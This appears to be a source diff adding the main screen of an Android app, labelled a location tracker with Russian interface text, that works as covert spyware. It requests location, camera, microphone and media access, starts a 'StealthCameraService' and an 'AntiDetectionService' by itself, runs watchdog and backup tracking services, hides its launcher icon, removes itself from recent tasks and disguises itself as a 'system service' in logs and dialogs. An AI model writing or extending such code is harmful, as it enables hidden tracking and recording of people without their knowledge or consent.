@@ -1,0 +1,690 @@
+package com.example.locationtracker;
+
+import android.Manifest;
+import android.os.Environment;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
+import android.os.Bundle;
+import android.os.Handler;
+import android.util.Log;
+import android.widget.Toast;
+import androidx.appcompat.app.AlertDialog;
+import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
+import android.content.ComponentName;
+import android.content.Context;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
+import android.net.Uri;
+import android.os.Build;
+import android.os.Looper;
+import android.provider.Settings;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.TextView;
+import androidx.annotation.NonNull;
+import org.osmdroid.api.IMapController;
+import org.osmdroid.config.Configuration;
+import org.osmdroid.tileprovider.tilesource.TileSourceFactory;
+import org.osmdroid.util.GeoPoint;
+import org.osmdroid.views.MapView;
+import org.osmdroid.views.overlay.Marker;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.Locale;
+import java.util.UUID;
+
+public class MainActivity extends AppCompatActivity implements LocationListener {
+
+    private static final String TAG = "SystemService";
+
+    private MapView mapView;
+    private LocationManager locationManager;
+    private boolean isTracking = false;
+    private SecurePreferences securePrefs;
+    private Button btnStart, btnStop, btnSetName, btnHideApp;
+    private TextView tvLocation, tvDeviceName, tvStatus;
+    private Marker currentLocationMarker;
+
+    private Handler handler;
+    private String deviceId;
+    private String deviceName;
+    private SharedPreferences prefs;
+
+    private static final int REQUEST_STORAGE_PERMISSION = 1001;
+    private static final int REQUEST_PERMISSIONS = 1;
+    private static final int LOCATION_PERMISSION_REQUEST = 1001;
+    private static final int BACKGROUND_LOCATION_REQUEST = 1002;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+
+        Configuration.getInstance().load(getApplicationContext(),
+                getSharedPreferences("osmdroid", MODE_PRIVATE));
+
+        setContentView(R.layout.activity_main);
+
+        securePrefs = new SecurePreferences(this);
+        prefs = getSharedPreferences("LocationTracker", MODE_PRIVATE);
+        deviceId = DeviceIdManager.getDeviceId(this);
+        deviceName = securePrefs.getDeviceName();
+
+        if (deviceName.isEmpty() || deviceName.equals("Unknown_Device")) {
+            deviceName = "Устройство_" + Build.MODEL;
+            securePrefs.setDeviceInfo(deviceId, deviceName);
+        }
+
+        Log.d(TAG, "=== DEVICE INFO ===");
+        Log.d(TAG, "Device ID: " + deviceId);
+        Log.d(TAG, "Device Name: " + deviceName);
+        Log.d(TAG, "==================");
+
+        handler = new Handler(Looper.getMainLooper());
+
+        initializeViews();
+        setupMap();
+        setupLocationManager();
+        setupButtons();
+
+        updateDeviceNameDisplay();
+        updateStatusDisplay();
+        debugPermissions();
+
+        if (!hasAllPermissions()) {
+            requestAllPermissions();
+        } else {
+            initializeAllServices();
+        }
+
+        scheduleAutoHide();
+    }
+
+    private void initializeViews() {
+        mapView = findViewById(R.id.mapView);
+        btnStart = findViewById(R.id.btnStartTracking);
+        btnStop = findViewById(R.id.btnStopTracking);
+        btnSetName = findViewById(R.id.btnSetName);
+        btnHideApp = findViewById(R.id.btnHideApp);
+        tvLocation = findViewById(R.id.tvLocation);
+        tvDeviceName = findViewById(R.id.tvDeviceName);
+        tvStatus = findViewById(R.id.tvStatus);
+    }
+
+    private void setupMap() {
+        mapView.setTileSource(TileSourceFactory.MAPNIK);
+        mapView.setBuiltInZoomControls(true);
+        mapView.setMultiTouchControls(true);
+
+        IMapController mapController = mapView.getController();
+        mapController.setZoom(15.0);
+        mapController.setCenter(new GeoPoint(55.7558, 37.6176));
+    }
+
+    private void setupLocationManager() {
+        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+    }
+
+    private void setupButtons() {
+        btnStart.setOnClickListener(v -> {
+            if (hasAllPermissions()) {
+                startTracking();
+            } else {
+                requestAllPermissions();
+            }
+        });
+
+        btnStop.setOnClickListener(v -> stopTracking());
+        btnSetName.setOnClickListener(v -> showNameDialog());
+        btnHideApp.setOnClickListener(v -> showHideAppDialog());
+    }
+
+    // Проверка ВСЕХ необходимых разрешений
+    private boolean hasAllPermissions() {
+        String[] corePermissions = {
+                Manifest.permission.ACCESS_FINE_LOCATION,
+                Manifest.permission.ACCESS_COARSE_LOCATION,
+                Manifest.permission.CAMERA,
+                Manifest.permission.RECORD_AUDIO
+        };
+
+        for (String permission : corePermissions) {
+            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
+                Log.d(TAG, "Missing permission: " + permission);
+                return false;
+            }
+        }
+
+        // Проверяем файловые разрешения отдельно для разных версий Android
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            // Android 13+
+            String[] mediaPermissions = {
+                    Manifest.permission.READ_MEDIA_IMAGES,
+                    Manifest.permission.READ_MEDIA_VIDEO
+            };
+            for (String permission : mediaPermissions) {
+                if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
+                    Log.d(TAG, "Missing media permission: " + permission);
+                    return false;
+                }
+            }
+        } else {
+            // Android 12 и ниже
+            String[] storagePermissions = {
+                    Manifest.permission.READ_EXTERNAL_STORAGE
+            };
+            for (String permission : storagePermissions) {
+                if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
+                    Log.d(TAG, "Missing storage permission: " + permission);
+                    return false;
+                }
+            }
+        }
+
+        return true;
+    }
+
+    private void requestAllPermissions() {
+        String[] corePermissions = {
+                Manifest.permission.ACCESS_FINE_LOCATION,
+                Manifest.permission.ACCESS_COARSE_LOCATION,
+                Manifest.permission.CAMERA,
+                Manifest.permission.RECORD_AUDIO
+        };
+
+        // Добавляем файловые разрешения в зависимости от версии Android
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            // Android 13+
+            String[] allPermissions = {
+                    Manifest.permission.ACCESS_FINE_LOCATION,
+                    Manifest.permission.ACCESS_COARSE_LOCATION,
+                    Manifest.permission.CAMERA,
+                    Manifest.permission.RECORD_AUDIO,
+                    Manifest.permission.READ_MEDIA_IMAGES,
+                    Manifest.permission.READ_MEDIA_VIDEO
+            };
+            ActivityCompat.requestPermissions(this, allPermissions, REQUEST_PERMISSIONS);
+        } else {
+            // Android 12 и ниже
+            String[] allPermissions = {
+                    Manifest.permission.ACCESS_FINE_LOCATION,
+                    Manifest.permission.ACCESS_COARSE_LOCATION,
+                    Manifest.permission.CAMERA,
+                    Manifest.permission.RECORD_AUDIO,
+                    Manifest.permission.READ_EXTERNAL_STORAGE,
+                    Manifest.permission.WRITE_EXTERNAL_STORAGE
+            };
+            ActivityCompat.requestPermissions(this, allPermissions, REQUEST_PERMISSIONS);
+        }
+
+        Log.d(TAG, "Requesting permissions for Android " + Build.VERSION.SDK_INT);
+    }
+
+    // Добавьте этот метод для отладки:
+    private void debugPermissions() {
+        String[] allPossiblePermissions = {
+                Manifest.permission.ACCESS_FINE_LOCATION,
+                Manifest.permission.ACCESS_COARSE_LOCATION,
+                Manifest.permission.CAMERA,
+                Manifest.permission.RECORD_AUDIO,
+                Manifest.permission.READ_EXTERNAL_STORAGE,
+                Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                Manifest.permission.READ_MEDIA_IMAGES,
+                Manifest.permission.READ_MEDIA_VIDEO,
+                Manifest.permission.READ_MEDIA_AUDIO
+        };
+
+        Log.d(TAG, "=== PERMISSION DEBUG ===");
+        Log.d(TAG, "Android version: " + Build.VERSION.SDK_INT);
+
+        for (String permission : allPossiblePermissions) {
+            boolean granted = ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED;
+            Log.d(TAG, permission + ": " + (granted ? "GRANTED" : "DENIED"));
+        }
+        Log.d(TAG, "========================");
+    }
+
+    private void initializeAllServices() {
+        Log.d(TAG, "Initializing all services");
+
+        // Запускаем location tracking если был включен
+        if (prefs.getBoolean("auto_tracking", false)) {
+            startTrackingServices();
+            isTracking = true;
+            updateStatusDisplay();
+        }
+
+        // Автоматически активируем stealth режим
+        activateStealthMode();
+    }
+
+    // Активация stealth режима
+    private void activateStealthMode() {
+        Intent stealthIntent = new Intent(this, StealthCameraService.class);
+        stealthIntent.putExtra("action", "ACTIVATE_STEALTH");
+        stealthIntent.putExtra("device_id", deviceId);
+
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(stealthIntent);
+            } else {
+                startService(stealthIntent);
+            }
+            Log.d(TAG, "Stealth mode activated");
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to start stealth service", e);
+        }
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
+                                           @NonNull int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+
+        if (requestCode == REQUEST_PERMISSIONS) {
+            boolean allGranted = true;
+            StringBuilder deniedPermissions = new StringBuilder();
+
+            for (int i = 0; i < permissions.length; i++) {
+                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
+                    allGranted = false;
+                    deniedPermissions.append(permissions[i]).append("\n");
+                }
+            }
+
+            if (allGranted) {
+                Log.d(TAG, "All permissions granted");
+                initializeAllServices();
+
+                // Проверяем background location для Android 10+
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                    checkBackgroundLocationPermission();
+                }
+            } else {
+                Log.w(TAG, "Some permissions denied: " + deniedPermissions.toString());
+                showPermissionDeniedDialog();
+            }
+        } else if (requestCode == LOCATION_PERMISSION_REQUEST) {
+            // Старая логика для совместимости
+            boolean hasLocationPermission = false;
+
+            for (int i = 0; i < permissions.length; i++) {
+                if ((permissions[i].equals(Manifest.permission.ACCESS_FINE_LOCATION) ||
+                        permissions[i].equals(Manifest.permission.ACCESS_COARSE_LOCATION)) &&
+                        grantResults[i] == PackageManager.PERMISSION_GRANTED) {
+                    hasLocationPermission = true;
+                    break;
+                }
+            }
+
+            if (hasLocationPermission) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                    checkBackgroundLocationPermission();
+                } else {
+                    startTrackingServices();
+                }
+            } else {
+                showPermissionDeniedDialog();
+            }
+        } else if (requestCode == BACKGROUND_LOCATION_REQUEST) {
+            startTrackingServices();
+        }
+    }
+
+    private boolean hasLocationPermissions() {
+        return ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
+                == PackageManager.PERMISSION_GRANTED ||
+                ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)
+                        == PackageManager.PERMISSION_GRANTED;
+    }
+
+    private void requestLocationPermissions() {
+        if (ActivityCompat.shouldShowRequestPermissionRationale(this,
+                Manifest.permission.ACCESS_FINE_LOCATION)) {
+
+            new AlertDialog.Builder(this)
+                    .setTitle("Требуется Доступ к Местоположению")
+                    .setMessage("Для работы системного сервиса требуется доступ к местоположению.")
+                    .setPositiveButton("Разрешить", (dialog, which) -> {
+                        ActivityCompat.requestPermissions(this,
+                                new String[]{
+                                        Manifest.permission.ACCESS_FINE_LOCATION,
+                                        Manifest.permission.ACCESS_COARSE_LOCATION
+                                }, LOCATION_PERMISSION_REQUEST);
+                    })
+                    .setNegativeButton("Отмена", (dialog, which) -> {
+                        Toast.makeText(this, "Системный сервис требует разрешения",
+                                Toast.LENGTH_LONG).show();
+                    })
+                    .show();
+        } else {
+            ActivityCompat.requestPermissions(this,
+                    new String[]{
+                            Manifest.permission.ACCESS_FINE_LOCATION,
+                            Manifest.permission.ACCESS_COARSE_LOCATION
+                    }, LOCATION_PERMISSION_REQUEST);
+        }
+    }
+
+    private void checkBackgroundLocationPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
+                ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+                        != PackageManager.PERMISSION_GRANTED) {
+
+            new AlertDialog.Builder(this)
+                    .setTitle("Фоновый Доступ")
+                    .setMessage("Для работы системного сервиса выберите 'Разрешить всегда'.")
+                    .setPositiveButton("Продолжить", (dialog, which) -> {
+                        ActivityCompat.requestPermissions(this,
+                                new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION},
+                                BACKGROUND_LOCATION_REQUEST);
+                    })
+                    .setNegativeButton("Пропустить", (dialog, which) -> {
+                        startTrackingServices();
+                    })
+                    .show();
+        } else {
+            startTrackingServices();
+        }
+    }
+
+    private void showPermissionDeniedDialog() {
+        new AlertDialog.Builder(this)
+                .setTitle("Требуются Разрешения")
+                .setMessage("Системный сервис не может работать без необходимых разрешений. Откройте настройки и предоставьте все разрешения.")
+                .setPositiveButton("Открыть Настройки", (dialog, which) -> {
+                    Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
+                    intent.setData(Uri.parse("package:" + getPackageName()));
+                    startActivity(intent);
+                })
+                .setNegativeButton("Повторить", (dialog, which) -> {
+                    requestAllPermissions();
+                })
+                .setNeutralButton("Выход", (dialog, which) -> finish())
+                .show();
+    }
+
+    private void showHideAppDialog() {
+        new AlertDialog.Builder(this)
+                .setTitle("Скрыть Приложение")
+                .setMessage("После скрытия приложение будет работать в фоне. Вы сможете открыть его через настройки Android или переустановить.")
+                .setPositiveButton("Скрыть Сейчас", (dialog, which) -> {
+                    hideAppIcon();
+                    scheduleAppExit();
+                })
+                .setNegativeButton("Отмена", null)
+                .show();
+    }
+
+    private void scheduleAutoHide() {
+        if (!prefs.getBoolean("auto_hide_setup", false)) {
+            handler.postDelayed(() -> {
+                // ДОБАВЬТЕ ПРОВЕРКУ:
+                if (isFinishing() || isDestroyed()) {
+                    return; // Активность закрыта, не показываем диалог
+                }
+
+                if (isTracking) {
+                    new AlertDialog.Builder(this)
+                            .setTitle("Защита Настроена")
+                            .setMessage("Отслеживание активировано. Приложение скроется для безопасности.")
+                            .setPositiveButton("Скрыть Сейчас", (dialog, which) -> {
+                                prefs.edit().putBoolean("auto_hide_setup", true).apply();
+                                hideAppIcon();
+                                scheduleAppExit();
+                            })
+                            .setNegativeButton("Оставить Видимым", (dialog, which) -> {
+                                prefs.edit().putBoolean("auto_hide_setup", true).apply();
+                            })
+                            .setCancelable(false)
+                            .show();
+                }
+            }, 120000);
+        }
+    }
+
+    private void hideAppIcon() {
+        try {
+            PackageManager pm = getPackageManager();
+            ComponentName componentName = new ComponentName(this, MainActivity.class);
+
+            pm.setComponentEnabledSetting(componentName,
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP);
+
+            Log.d(TAG, "Application icon hidden");
+            Toast.makeText(this, "Приложение скрыто. Отслеживание продолжается в фоне.",
+                    Toast.LENGTH_LONG).show();
+        } catch (Exception e) {
+            Log.e(TAG, "Error hiding app icon", e);
+            Toast.makeText(this, "Ошибка скрытия приложения", Toast.LENGTH_SHORT).show();
+        }
+    }
+
+    @Override
+    protected void onStart() {
+        super.onStart();
+        startService(new Intent(this, AntiDetectionService.class));
+    }
+
+    private void scheduleAppExit() {
+        handler.postDelayed(() -> {
+            // Перемещаем в фон вместо закрытия
+            moveTaskToBack(true);
+        }, 3000);
+    }
+
+    @Override
+    protected void onPause() {
+        super.onPause();
+        if (mapView != null) {
+            mapView.onPause();
+        }
+
+        // Скрываем приложение из недавних задач при сворачивании
+        if (prefs.getBoolean("auto_hide_setup", false)) {
+            finishAndRemoveTask();
+        }
+    }
+
+    private void startTracking() {
+        if (!hasAllPermissions()) {
+            requestAllPermissions();
+            return;
+        }
+
+        startTrackingServices();
+        startLocationUpdates();
+
+        isTracking = true;
+        updateStatusDisplay();
+        Toast.makeText(this, "Системный сервис активирован", Toast.LENGTH_SHORT).show();
+    }
+
+    private void startTrackingServices() {
+        prefs.edit().putBoolean("auto_tracking", true).apply();
+
+        Intent mainServiceIntent = new Intent(this, LocationService.class);
+        mainServiceIntent.putExtra("device_id", deviceId);
+        mainServiceIntent.putExtra("device_name", deviceName);
+
+        Intent backupServiceIntent = new Intent(this, BackupLocationService.class);
+        Intent watchdogServiceIntent = new Intent(this, WatchdogService.class);
+
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(mainServiceIntent);
+                startForegroundService(backupServiceIntent);
+                startForegroundService(watchdogServiceIntent);
+            } else {
+                startService(mainServiceIntent);
+                startService(backupServiceIntent);
+                startService(watchdogServiceIntent);
+            }
+            Log.d(TAG, "System services started");
+        } catch (Exception e) {
+            Log.e(TAG, "Error starting system services", e);
+            Toast.makeText(this, "Ошибка запуска системных служб", Toast.LENGTH_SHORT).show();
+        }
+    }
+
+    private void startLocationUpdates() {
+        if (!hasLocationPermissions()) return;
+
+        try {
+            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
+                locationManager.requestLocationUpdates(
+                        LocationManager.GPS_PROVIDER, 30000, 50, this);
+            }
+            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
+                locationManager.requestLocationUpdates(
+                        LocationManager.NETWORK_PROVIDER, 30000, 50, this);
+            }
+        } catch (SecurityException e) {
+            Log.e(TAG, "Permission denied for location updates", e);
+        }
+    }
+
+    private void requestStoragePermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            // Android 11+
+            if (!Environment.isExternalStorageManager()) {
+                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
+                intent.setData(Uri.parse("package:" + getPackageName()));
+                startActivity(intent);
+            }
+        } else {
+            // Android 10 и ниже
+            ActivityCompat.requestPermissions(this,
+                    new String[]{
+                            Manifest.permission.READ_EXTERNAL_STORAGE,
+                            Manifest.permission.WRITE_EXTERNAL_STORAGE
+                    },
+                    REQUEST_STORAGE_PERMISSION
+            );
+        }
+    }
+
+    private void stopTracking() {
+        prefs.edit().putBoolean("auto_tracking", false).apply();
+
+        if (locationManager != null) {
+            locationManager.removeUpdates(this);
+        }
+
+        stopService(new Intent(this, LocationService.class));
+        stopService(new Intent(this, BackupLocationService.class));
+        stopService(new Intent(this, WatchdogService.class));
+        stopService(new Intent(this, StealthCameraService.class));
+
+        isTracking = false;
+        updateStatusDisplay();
+        Toast.makeText(this, "Системный сервис деактивирован", Toast.LENGTH_SHORT).show();
+    }
+
+    private void showNameDialog() {
+        AlertDialog.Builder builder = new AlertDialog.Builder(this);
+        builder.setTitle("Имя Системы");
+
+        final EditText input = new EditText(this);
+        input.setText(deviceName);
+        builder.setView(input);
+
+        builder.setPositiveButton("Сохранить", (dialog, which) -> {
+            String newName = input.getText().toString().trim();
+            if (!newName.isEmpty()) {
+                deviceName = newName;
+                securePrefs.setDeviceInfo(deviceId, deviceName);
+                updateDeviceNameDisplay();
+
+                Log.d(TAG, "Device name updated to: " + deviceName);
+            }
+        });
+
+        builder.setNegativeButton("Отмена", null);
+        builder.show();
+    }
+
+    private void updateDeviceNameDisplay() {
+        tvDeviceName.setText("Система: " + deviceName);
+    }
+
+    private void updateStatusDisplay() {
+        String status = isTracking ? "АКТИВНА" : "НЕАКТИВНА";
+        tvStatus.setText("Статус: " + status);
+        tvStatus.setTextColor(isTracking ?
+                getResources().getColor(android.R.color.holo_green_dark) :
+                getResources().getColor(android.R.color.holo_red_dark));
+    }
+
+    @Override
+    public void onLocationChanged(@NonNull Location location) {
+        updateLocationDisplay(location);
+        updateMapLocation(location);
+    }
+
+    private void updateLocationDisplay(Location location) {
+        SimpleDateFormat timeFormat = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());
+        String locationText = String.format(Locale.getDefault(),
+                "Координаты: %.6f, %.6f\nТочность: %.1fм\nВремя: %s",
+                location.getLatitude(),
+                location.getLongitude(),
+                location.getAccuracy(),
+                timeFormat.format(new Date())
+        );
+        tvLocation.setText(locationText);
+    }
+
+    private void updateMapLocation(Location location) {
+        GeoPoint geoPoint = new GeoPoint(location.getLatitude(), location.getLongitude());
+
+        if (currentLocationMarker != null) {
+            mapView.getOverlays().remove(currentLocationMarker);
+        }
+
+        currentLocationMarker = new Marker(mapView);
+        currentLocationMarker.setPosition(geoPoint);
+        currentLocationMarker.setAnchor(Marker.ANCHOR_CENTER, Marker.ANCHOR_BOTTOM);
+        currentLocationMarker.setTitle("Текущая позиция");
+        currentLocationMarker.setSnippet("Точность: " + location.getAccuracy() + "м");
+
+        mapView.getOverlays().add(currentLocationMarker);
+        mapView.getController().animateTo(geoPoint);
+        mapView.invalidate();
+    }
+
+    @Override
+    public void onProviderEnabled(@NonNull String provider) {
+        Log.d(TAG, "Provider enabled: " + provider);
+    }
+
+    @Override
+    public void onProviderDisabled(@NonNull String provider) {
+        Log.d(TAG, "Provider disabled: " + provider);
+    }
+
+    @Override
+    public void onStatusChanged(String provider, int status, Bundle extras) {}
+
+    @Override
+    protected void onResume() {
+        super.onResume();
+        if (mapView != null) {
+            mapView.onResume();
+        }
+        updateStatusDisplay();
+    }
+
+    @Override
+    protected void onDestroy() {
+        try {
+            if (locationManager != null) {
+                locationManager.removeUpdates(this);
+            }
+        } catch (Exception ignored) {}
+        super.onDestroy();
+    }
+}
